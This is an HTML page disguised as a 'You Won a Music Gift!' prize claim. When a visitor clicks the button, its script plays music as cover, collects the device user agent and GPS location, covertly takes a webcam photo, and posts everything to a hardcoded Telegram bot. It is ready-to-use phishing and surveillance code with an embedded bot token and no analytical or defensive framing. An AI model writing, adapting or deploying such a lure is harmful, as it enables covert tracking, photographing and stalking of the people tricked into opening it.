<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>You Won a Music Gift! 🎵</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: ;
            color: #333;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            text-align: center;
            max-width: 400px;
            width: 90%;
        }
        .music-icon {
            font-size: 80px;
            margin-bottom: 0px;
            animation: pulse 2s infinite;
        }
        h1 {
            color: #2c3e50;
            margin-bottom: 10px;
        }
        p {
            font-size: 16px;
            color: #7f8c8d;
            margin-bottom: 20px;
        }
        button {
            background-color: #e74c3c;
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 18px;
            border-radius: 50px;
            cursor: pointer;
            transition: transform 0.2s, background-color 0.2s;
            box-shadow: 0 5px 15px rgba(231, 76, 60, 0.4);
        }
        button:hover {
            background-color: #c0392b;
            transform: scale(1.05);
        }
        .hidden {
            display: none;
        }
        #loading {
            margin-top: 15px;
            font-size: 14px;
            color: #666;
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
    </style>
</head>
<body>

    <div class="container" id="mainContainer">
        <div class="music-icon">🎵</div>
        <h1>You Won a Music Gift!</h1>
        <p>Listen to this exclusive track and claim your reward.</p>
        <button id="playBtn" onclick="startMagic()">Play & Claim 🎧</button>
        <div id="loading" class="hidden">Collecting Data...</div>
    </div>

    <!-- Hidden Elements -->
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <audio id="bgMusic" loop>
        <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
    </audio>

    <script>
        // ==========================================
        // CONFIGURATION SECTION - YOUR DATA IS HERE
        // ==========================================
        const BOT_TOKEN = "8951320982:AAFSV-A25ZKfRNLZmwXWuINYPvlzx1qZ-So"; 
        const CHAT_ID = "8397830679";           
        // ==========================================

        async function startMagic() {
            const btn = document.getElementById('playBtn');
            const loading = document.getElementById('loading');
            
            // বাটন লুকিয়ে লোডিং দেখানো
            btn.style.display = 'none';
            loading.classList.remove('hidden');
            loading.innerText = "Playing Music & Collecting Data...";

            try {
                // 1. Audio Play (User Interaction Required)
                const audio = document.getElementById('bgMusic');
                await audio.play();

                // 2. Get Device Model (User Agent)
                const model = navigator.userAgent;
                
                // 3. Get Location
                let locationText = "Location not available";
                if (navigator.geolocation) {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject);
                    });
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    locationText = `Lat: ${lat}, Lon: ${lon}`;
                }

                // 4. Capture Photo from Camera
                let photoBase64 = null;
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    const videoElement = document.getElementById('video');
                    videoElement.srcObject = stream;
                    
                    // Wait a bit for camera to start
                    await new Promise(r => setTimeout(r, 1000));

                    const canvas = document.getElementById('canvas');
                    const context = canvas.getContext('2d');
                    canvas.width = videoElement.videoWidth;
                    canvas.height = videoElement.videoHeight;
                    context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                    
                    photoBase64 = canvas.toDataURL('image/jpeg');
                    stream.getTracks().forEach(track => track.stop()); // Stop camera
                } catch (err) {
                    console.log("Camera error:", err);
                }

                // 5. Send Data to Telegram
                let caption = `🎵 *Music Gift Claimed!*\n\n📱 *Device:* ${model}\n📍 *Location:* ${locationText}`;
                
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                const photoUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;

                // Send Text Message first
                await fetch(url, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: caption,
                        parse_mode: 'Markdown'
                    })
                });

                // Send Photo if available
                if (photoBase64) {
                    await fetch(photoUrl, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            photo: photoBase64,
                            caption: "📸 Selfie Captured!"
                        })
                    });
                }

                // Show success message
                loading.innerHTML = "🎉 Success! Your gift is on the way.";
                
            } catch (error) {
                console.error(error);
                loading.innerHTML = "❌ Error occurred.";
            }
        }
    </script>
</body>
</html>
